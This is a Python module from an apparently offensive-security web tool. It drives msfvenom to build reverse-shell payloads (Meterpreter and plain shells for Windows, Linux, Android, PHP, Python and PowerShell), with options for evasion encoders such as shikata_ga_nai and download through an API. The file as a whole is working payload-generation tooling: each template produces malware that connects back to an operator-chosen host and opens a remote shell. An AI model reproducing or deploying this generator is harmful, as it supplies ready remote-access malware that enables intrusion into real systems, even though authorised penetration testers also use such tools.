"""
msfvenom payload generator.
Gracefully degrades if msfvenom is not installed.
Output files are written to data/payloads/ and served via /api/msf/payload/download/<filename>.
"""

import os
import subprocess
import shutil
import time
import re

_OUTPUT_DIR = os.path.join(os.path.dirname(__file__), '..', '..', 'data', 'payloads')

# Payload templates: (display_name, msfvenom_payload, default_format, description)
PAYLOAD_TEMPLATES = {
    'windows_reverse_tcp': {
        'name': 'Windows Meterpreter Reverse TCP',
        'payload': 'windows/meterpreter/reverse_tcp',
        'format': 'exe',
        'arch': 'x86',
        'platform': 'windows',
        'description': 'Staged Meterpreter reverse shell for Windows x86',
    },
    'windows_x64_reverse_tcp': {
        'name': 'Windows x64 Meterpreter Reverse TCP',
        'payload': 'windows/x64/meterpreter/reverse_tcp',
        'format': 'exe',
        'arch': 'x64',
        'platform': 'windows',
        'description': 'Staged Meterpreter reverse shell for Windows x64',
    },
    'windows_reverse_https': {
        'name': 'Windows Meterpreter Reverse HTTPS',
        'payload': 'windows/meterpreter/reverse_https',
        'format': 'exe',
        'arch': 'x86',
        'platform': 'windows',
        'description': 'Encrypted Meterpreter reverse shell (HTTPS) for Windows',
    },
    'linux_reverse_tcp': {
        'name': 'Linux Meterpreter Reverse TCP',
        'payload': 'linux/x86/meterpreter/reverse_tcp',
        'format': 'elf',
        'arch': 'x86',
        'platform': 'linux',
        'description': 'Staged Meterpreter reverse shell for Linux x86',
    },
    'linux_x64_reverse_tcp': {
        'name': 'Linux x64 Meterpreter Reverse TCP',
        'payload': 'linux/x64/meterpreter/reverse_tcp',
        'format': 'elf',
        'arch': 'x64',
        'platform': 'linux',
        'description': 'Staged Meterpreter reverse shell for Linux x64',
    },
    'python_reverse_tcp': {
        'name': 'Python Reverse TCP Shell',
        'payload': 'python/meterpreter/reverse_tcp',
        'format': 'raw',
        'arch': 'python',
        'platform': 'python',
        'description': 'Python Meterpreter reverse shell — cross-platform',
    },
    'php_reverse_tcp': {
        'name': 'PHP Reverse TCP Shell',
        'payload': 'php/meterpreter/reverse_tcp',
        'format': 'raw',
        'arch': 'php',
        'platform': 'php',
        'description': 'PHP Meterpreter reverse shell for web server targets',
    },
    'android_reverse_tcp': {
        'name': 'Android Meterpreter Reverse TCP',
        'payload': 'android/meterpreter/reverse_tcp',
        'format': 'apk',
        'arch': 'dalvik',
        'platform': 'android',
        'description': 'Android Meterpreter reverse shell APK',
    },
    'powershell_reverse_tcp': {
        'name': 'PowerShell Reverse TCP',
        'payload': 'windows/x64/powershell_reverse_tcp',
        'format': 'ps1',
        'arch': 'x64',
        'platform': 'windows',
        'description': 'PowerShell-based reverse shell for Windows',
    },
    'windows_shell_reverse_tcp': {
        'name': 'Windows CMD Shell Reverse TCP',
        'payload': 'windows/shell/reverse_tcp',
        'format': 'exe',
        'arch': 'x86',
        'platform': 'windows',
        'description': 'Simple CMD shell reverse connection (no Meterpreter)',
    },
}

ENCODERS = {
    'none': None,
    'x86_shikata': 'x86/shikata_ga_nai',
    'x64_xor': 'x64/xor_dynamic',
    'x86_countdown': 'x86/countdown',
    'x86_jmp_call': 'x86/jmp_call_additive',
}


def is_available():
    return shutil.which('msfvenom') is not None


def list_templates():
    return [
        {'key': k, **{kk: vv for kk, vv in v.items()}}
        for k, v in PAYLOAD_TEMPLATES.items()
    ]


def generate(template_key, lhost, lport, encoder='none', iterations=1,
             extra_options=None, custom_format=None):
    """
    Generate a payload using msfvenom.
    Returns dict with file path, metadata, and handler config.
    Gracefully returns error dict if msfvenom not found.
    """
    if not is_available():
        return {
            'success': False,
            'error': 'msfvenom not found — install Metasploit Framework',
            'msf_available': False,
        }

    template = PAYLOAD_TEMPLATES.get(template_key)
    if not template:
        return {'success': False, 'error': f'Unknown template: {template_key}'}

    # Validate inputs
    if not _valid_ip_or_host(lhost):
        return {'success': False, 'error': f'Invalid LHOST: {lhost}'}
    try:
        lport = int(lport)
        if not (1 <= lport <= 65535):
            raise ValueError
    except ValueError:
        return {'success': False, 'error': f'Invalid LPORT: {lport}'}

    os.makedirs(_OUTPUT_DIR, exist_ok=True)

    fmt = custom_format or template['format']
    ext = _ext_for_format(fmt)
    timestamp = int(time.time())
    filename = f"payload_{template_key}_{timestamp}{ext}"
    output_path = os.path.join(_OUTPUT_DIR, filename)

    cmd = [
        'msfvenom',
        '-p', template['payload'],
        f'LHOST={lhost}',
        f'LPORT={lport}',
        '-f', fmt,
        '-o', output_path,
    ]

    encoder_str = ENCODERS.get(encoder)
    if encoder_str:
        cmd += ['-e', encoder_str, '-i', str(max(1, int(iterations)))]

    if extra_options:
        for k, v in extra_options.items():
            cmd.append(f'{k}={v}')

    try:
        result = subprocess.run(
            cmd,
            capture_output=True, text=True, timeout=120
        )
        if result.returncode != 0:
            return {
                'success': False,
                'error': result.stderr.strip() or 'msfvenom failed',
                'cmd': ' '.join(cmd),
            }

        size = os.path.getsize(output_path) if os.path.exists(output_path) else 0
        return {
            'success': True,
            'filename': filename,
            'path': output_path,
            'size_bytes': size,
            'payload': template['payload'],
            'format': fmt,
            'lhost': lhost,
            'lport': lport,
            'encoder': encoder_str,
            'iterations': iterations,
            'platform': template['platform'],
            'arch': template['arch'],
            'handler': {
                'payload': template['payload'],
                'lhost': lhost,
                'lport': lport,
            },
            'msf_available': True,
        }
    except subprocess.TimeoutExpired:
        return {'success': False, 'error': 'msfvenom timed out after 120s'}
    except Exception as e:
        return {'success': False, 'error': str(e)}


def list_generated():
    """List previously generated payloads in data/payloads/."""
    if not os.path.isdir(_OUTPUT_DIR):
        return []
    files = []
    for fname in sorted(os.listdir(_OUTPUT_DIR), reverse=True):
        fpath = os.path.join(_OUTPUT_DIR, fname)
        if os.path.isfile(fpath):
            files.append({
                'filename': fname,
                'size_bytes': os.path.getsize(fpath),
                'created': int(os.path.getmtime(fpath)),
            })
    return files


def delete_payload(filename):
    """Delete a generated payload file."""
    if not re.match(r'^payload_[\w]+\.[\w]+$', filename):
        return {'success': False, 'error': 'Invalid filename'}
    path = os.path.join(_OUTPUT_DIR, filename)
    if not os.path.exists(path):
        return {'success': False, 'error': 'File not found'}
    os.remove(path)
    return {'success': True}


def _valid_ip_or_host(value):
    if not value or len(value) > 255:
        return False
    # Allow IP or hostname
    allowed = re.compile(r'^[a-zA-Z0-9.\-_]+$')
    return bool(allowed.match(value))


def _ext_for_format(fmt):
    return {
        'exe': '.exe', 'elf': '.elf', 'apk': '.apk',
        'raw': '.bin', 'ps1': '.ps1', 'py': '.py',
        'php': '.php', 'jar': '.jar', 'war': '.war',
        'asp': '.asp', 'aspx': '.aspx',
    }.get(fmt, f'.{fmt}')
